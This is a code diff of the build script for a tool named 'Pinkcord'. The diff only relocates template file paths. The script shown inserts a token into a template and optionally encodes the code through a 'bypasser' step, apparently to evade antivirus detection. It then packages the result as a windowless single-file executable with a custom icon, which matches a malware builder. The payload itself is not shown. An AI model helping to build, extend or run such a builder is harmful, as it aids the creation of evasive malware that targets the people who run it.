@@ -5,9 +5,9 @@ import base64
 import platform
 import os
 
-TOKEN_FILE = 'pinkcord.py'
+TOKEN_FILE = 'template/pinkcord.py'
 TO_BYPASS_FILE = 'to_bypass.txt'
-BYPASS_FILE = 'pinkcord_bypass.py'
+BYPASS_FILE = 'template/pinkcord_bypass.py'
 DIST_FOLDER = 'dist'
 COLOR_RESET = "\033[0m"
 GREEN_COLOR = "\033[32m"
@@ -53,7 +53,7 @@ print(YELLOW_COLOR + 'Replacing the token in the pinkcord.py file....' + COLOR_R
 with open(TOKEN_FILE, 'r') as sc:
     content = sc.read()
     content = content.replace("<TOKEN>", token)
-with open(TOKEN_FILE, 'w') as sc:
+with open("pinkcord.py", 'w') as sc:
     sc.write(content)
 clear_console()
 print(asciart)
@@ -87,7 +87,7 @@ print(RED_COLOR + '2. No' + COLOR_RESET)
 answer = input("Choice: ")
 if answer == "1":
     print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
-    with open(TOKEN_FILE, 'r') as sourcecode:
+    with open("pinkcord.py", 'r') as sourcecode:
         with open(TO_BYPASS_FILE, 'w') as codefile:
             codefile.write(sourcecode.read())
             subprocess.check_call([sys.executable, 'bypasser.py'])
@@ -99,7 +99,7 @@ if answer == "1":
     with open(BYPASS_FILE, 'r') as bypass:
         content = bypass.read()
         content = content.replace("<BYPASS>", encoded_code)
-    with open(BYPASS_FILE, 'w') as bypass:
+    with open("pinkcord_bypass.py", 'w') as bypass:
         bypass.write(content)
     clear_console()
     print(asciart)
@@ -110,13 +110,13 @@ if answer == "1":
             '--onefile',
             '--windowed',
             f'--icon={icon}',
-            BYPASS_FILE
+            "pinkcord_bypass.py"
         ]
     else: 
         params = [
             '--onefile',
             '--windowed',
-            BYPASS_FILE
+            "pinkcord_bypass.py"
         ]
     PyInstaller.__main__.run(params)
     clear_console()
@@ -133,13 +133,13 @@ else:
             '--onefile',
             '--windowed',
             f'--icon={icon}',
-            TOKEN_FILE
+            "pinkcord.py"
         ]
     else:
         params = [
             '--onefile',
             '--windowed',
-            TOKEN_FILE
+            "pinkcord.py"
         ]
     PyInstaller.__main__.run(params)
     clear_console()
